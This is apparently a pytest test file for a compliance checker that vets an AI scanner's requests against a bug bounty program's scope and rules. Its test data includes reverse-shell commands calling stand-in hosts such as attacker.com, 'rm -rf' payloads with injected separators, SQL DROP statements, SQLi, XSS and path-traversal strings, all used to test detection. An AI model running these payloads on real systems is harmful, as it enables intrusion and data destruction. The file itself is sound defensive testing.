"""Тесты для AI-методов ComplianceManager — валидация AI-запросов."""

import uuid

import pytest

from app.models.ai_scan_schemas import AIRequest, AIRequestStatus
from app.models.schemas import Asset, AssetType, ProgramRule
from app.services.compliance_manager import ComplianceManager


@pytest.fixture
def manager() -> ComplianceManager:
    return ComplianceManager()


def _rule(description: str, is_allowed: bool, category: str = "general") -> ProgramRule:
    """Хелпер для создания правила."""
    return ProgramRule(
        id=str(uuid.uuid4()),
        description=description,
        is_allowed=is_allowed,
        category=category,
    )


def _asset(target: str, in_scope: bool = True) -> Asset:
    """Хелпер для создания актива."""
    return Asset(
        id=str(uuid.uuid4()),
        name=f"Asset {target}",
        asset_type=AssetType.WEB_APPLICATION,
        target=target,
        in_scope=in_scope,
    )


def _ai_request(
    url: str = "https://example.com/api",
    method: str = "GET",
    body: str | None = None,
) -> AIRequest:
    """Хелпер для создания AI-запроса."""
    return AIRequest(
        id=str(uuid.uuid4()),
        hypothesis_id="h1",
        method=method,
        url=url,
        headers={"User-Agent": "TestAgent"},
        body=body,
    )


class TestValidateAIRequest:
    """Тесты validate_ai_request."""

    def test_allowed_when_in_scope(self, manager: ComplianceManager):
        """Запрос разрешён, если URL в scope."""
        request = _ai_request(url="https://app.example.com/api")
        scope = [_asset("https://app.example.com", in_scope=True)]

        result = manager.validate_ai_request(request, rules=[], scope=scope)

        assert result.action_allowed is True

    def test_blocked_when_out_of_scope(self, manager: ComplianceManager):
        """Запрос блокируется, если URL вне scope."""
        request = _ai_request(url="https://other.example.com/api")
        scope = [_asset("https://app.example.com", in_scope=True)]

        result = manager.validate_ai_request(request, rules=[], scope=scope)

        assert result.action_allowed is False
        assert "scope" in result.reason.lower()

    def test_blocked_by_forbidden_rule(self, manager: ComplianceManager):
        """Запрос блокируется запрещающим правилом."""
        request = _ai_request(url="https://app.example.com/api", body="DROP TABLE users")
        scope = [_asset("https://app.example.com", in_scope=True)]
        rules = [_rule("SQL injection testing is forbidden", is_allowed=False)]

        result = manager.validate_ai_request(request, rules=rules, scope=scope)

        # Зависит от реализации — может блокироваться по правилу или по деструктивности
        # В любом случае должен быть заблокирован
        assert result.action_allowed is False

    def test_allowed_with_empty_scope_and_rules(self, manager: ComplianceManager):
        """Запрос разрешён при пустых scope и rules (дефолтное поведение)."""
        request = _ai_request()

        result = manager.validate_ai_request(request, rules=[], scope=[])

        # Поведение зависит от реализации — может быть разрешено или заблокировано
        # Проверяем, что метод не падает
        assert isinstance(result.action_allowed, bool)


class TestIsDestructiveAction:
    """Тесты is_destructive_action."""

    def test_drop_table_is_destructive(self, manager: ComplianceManager):
        """DROP TABLE — деструктивное действие."""
        request = _ai_request(body="DROP TABLE users;")
        result = manager.is_destructive_action(request)
        assert result is not None  # возвращает строку с описанием

    def test_delete_from_is_destructive(self, manager: ComplianceManager):
        """DELETE FROM — деструктивное действие."""
        request = _ai_request(body="DELETE FROM users WHERE id=1;")
        result = manager.is_destructive_action(request)
        assert result is not None

    def test_truncate_is_destructive(self, manager: ComplianceManager):
        """TRUNCATE — деструктивное действие."""
        request = _ai_request(body="TRUNCATE TABLE logs;")
        result = manager.is_destructive_action(request)
        assert result is not None

    def test_rm_rf_is_destructive(self, manager: ComplianceManager):
        """rm -rf — деструктивное действие."""
        request = _ai_request(body="; rm -rf /")
        result = manager.is_destructive_action(request)
        assert result is not None

    def test_reverse_shell_is_destructive(self, manager: ComplianceManager):
        """Reverse shell — деструктивное действие."""
        request = _ai_request(body="bash -i >& /dev/tcp/attacker.com/4444 0>&1")
        result = manager.is_destructive_action(request)
        assert result is not None

    def test_select_is_not_destructive(self, manager: ComplianceManager):
        """SELECT — не деструктивное действие."""
        request = _ai_request(body="SELECT * FROM users WHERE id=1")
        result = manager.is_destructive_action(request)
        assert result is None

    def test_normal_request_is_not_destructive(self, manager: ComplianceManager):
        """Обычный запрос — не деструктивное действие."""
        request = _ai_request(body='{"username": "test", "password": "test"}')
        result = manager.is_destructive_action(request)
        assert result is None

    def test_empty_body_is_not_destructive(self, manager: ComplianceManager):
        """Пустое тело — не деструктивное действие."""
        request = _ai_request(body=None)
        result = manager.is_destructive_action(request)
        assert result is None

    def test_url_with_destructive_payload_is_destructive(self, manager: ComplianceManager):
        """URL с деструктивным payload — деструктивное действие."""
        request = _ai_request(url="https://example.com/api?cmd=rm%20-rf%20/")
        # URL-encoded rm -rf может не распознаваться, зависит от реализации
        result = manager.is_destructive_action(request)
        # Не проверяем строго — зависит от декодирования URL
        assert result is None or isinstance(result, str)

    def test_case_insensitive_detection(self, manager: ComplianceManager):
        """Регистронезависимое обнаружение."""
        request = _ai_request(body="drop table USERS;")
        result = manager.is_destructive_action(request)
        assert result is not None


class TestDestructivePatterns:
    """Тесты паттернов деструктивных действий."""

    @pytest.mark.parametrize("payload", [
        "DROP DATABASE production;",
        "drop database test",
        "DELETE FROM orders;",
        "TRUNCATE TABLE sessions;",
        "truncate logs",
        "; rm -rf /var/www",
        "| rm -rf ~",
        "&& rm -rf /tmp",
        "nc -e /bin/sh attacker.com 4444",
        "bash -c 'bash -i >& /dev/tcp/10.0.0.1/8080 0>&1'",
        "python -c 'import socket,subprocess,os;...'",
        "perl -e 'use Socket;...'",
        "php -r '$sock=fsockopen(...)'",
    ])
    def test_destructive_patterns_detected(self, manager: ComplianceManager, payload: str):
        """Деструктивные паттерны обнаруживаются."""
        request = _ai_request(body=payload)
        result = manager.is_destructive_action(request)
        assert result is not None, f"Failed to detect: {payload}"

    @pytest.mark.parametrize("payload", [
        "SELECT * FROM users",
        "SELECT id, name FROM products WHERE price > 100",
        '{"action": "read", "id": 123}',
        "GET /api/users HTTP/1.1",
        "normal text content",
        "1' OR '1'='1",  # SQLi payload, но не деструктивный
        "<script>alert(1)</script>",  # XSS payload, но не деструктивный
        "../../../etc/passwd",  # Path traversal, но не деструктивный (GET)
    ])
    def test_safe_patterns_not_detected(self, manager: ComplianceManager, payload: str):
        """Безопасные паттерны не обнаруживаются как деструктивные."""
        request = _ai_request(body=payload)
        result = manager.is_destructive_action(request)
        assert result is None, f"False positive: {payload}"


class TestGetProgramRateLimit:
    """Тесты get_program_rate_limit."""

    def test_default_rate_limit(self, manager: ComplianceManager, db_session: Session):
        """Дефолтный rate limit при отсутствии правил."""
        _seed_program(db_session, "prog-1")
        rate = manager.get_program_rate_limit("prog-1", db_session)
        assert rate is None  # нет правил с rate limit

    def test_rate_limit_from_rule(self, manager: ComplianceManager, db_session: Session):
        """Rate limit из правила программы."""
        _seed_program(db_session, "prog-1")
        _seed_db_rule(db_session, "prog-1", "Rate limit: 2 requests per second", is_allowed=True, category="rate_limit")

        rate = manager.get_program_rate_limit("prog-1", db_session)
        assert rate == 2.0

    def test_effective_rate_limit(self, manager: ComplianceManager, db_session: Session):
        """Эффективный rate limit — минимум из правила и дефолта."""
        _seed_program(db_session, "prog-1")
        _seed_db_rule(db_session, "prog-1", "Rate limit: 10 requests per second", is_allowed=True, category="rate_limit")

        rate = manager.get_effective_rate_limit("prog-1", db_session, default_limit=5.0)
        assert rate == 5.0  # минимум из 10 и 5


# DB fixtures for rate limit tests
from sqlalchemy import create_engine
from sqlalchemy.orm import Session, sessionmaker
from sqlalchemy.pool import StaticPool

from app.models.database import Base, Program
from app.models.database import ProgramRule as ProgramRuleDB


@pytest.fixture()
def db_session():
    """In-memory SQLite для тестов."""
    engine = create_engine(
        "sqlite:///:memory:",
        connect_args={"check_same_thread": False},
        poolclass=StaticPool,
    )
    Base.metadata.create_all(bind=engine)
    session = sessionmaker(bind=engine)()
    yield session
    session.close()


def _seed_program(db: Session, program_id: str, name: str = "Test Program") -> Program:
    """Создаёт программу в БД."""
    p = Program(
        id=program_id,
        name=name,
        platform="custom",
        disclosure_requirements="",
        raw_text="",
    )
    db.add(p)
    db.commit()
    return p


def _seed_db_rule(
    db: Session,
    program_id: str,
    description: str,
    is_allowed: bool,
    category: str = "testing_method",
) -> ProgramRuleDB:
    """Создаёт правило программы в БД."""
    rule = ProgramRuleDB(
        id=str(uuid.uuid4()),
        program_id=program_id,
        description=description,
        is_allowed=is_allowed,
        category=category,
    )
    db.add(rule)
    db.commit()
    return rule


class TestValidateAIRequestIntegration:
    """Интеграционные тесты validate_ai_request."""

    def test_destructive_action_blocked_even_in_scope(self, manager: ComplianceManager):
        """Деструктивное действие блокируется даже в scope."""
        request = _ai_request(
            url="https://app.example.com/api",
            body="DROP TABLE users;",
        )
        scope = [_asset("https://app.example.com", in_scope=True)]

        result = manager.validate_ai_request(request, rules=[], scope=scope)

        assert result.action_allowed is False
        assert "destructive" in result.reason.lower() or "деструктив" in result.reason.lower()

    def test_multiple_checks_all_pass(self, manager: ComplianceManager):
        """Все проверки проходят — запрос разрешён."""
        request = _ai_request(
            url="https://app.example.com/api?id=1",
            method="GET",
            body=None,
        )
        scope = [_asset("https://app.example.com", in_scope=True)]
        rules = [_rule("GET requests are allowed", is_allowed=True)]

        result = manager.validate_ai_request(request, rules=rules, scope=scope)

        assert result.action_allowed is True

    def test_subdomain_matching(self, manager: ComplianceManager):
        """Проверка соответствия поддоменов."""
        request = _ai_request(url="https://api.example.com/v1/users")
        scope = [
            _asset("https://example.com", in_scope=True),
            _asset("https://api.example.com", in_scope=True),
        ]

        result = manager.validate_ai_request(request, rules=[], scope=scope)

        assert result.action_allowed is True

    def test_path_matching(self, manager: ComplianceManager):
        """Проверка соответствия путей."""
        request = _ai_request(url="https://example.com/admin/users")
        scope = [
            _asset("https://example.com", in_scope=True),
            _asset("https://example.com/admin", in_scope=False),  # admin вне scope
        ]

        result = manager.validate_ai_request(request, rules=[], scope=scope)

        # Поведение зависит от реализации — может проверять точное совпадение или префикс
        assert isinstance(result.action_allowed, bool)
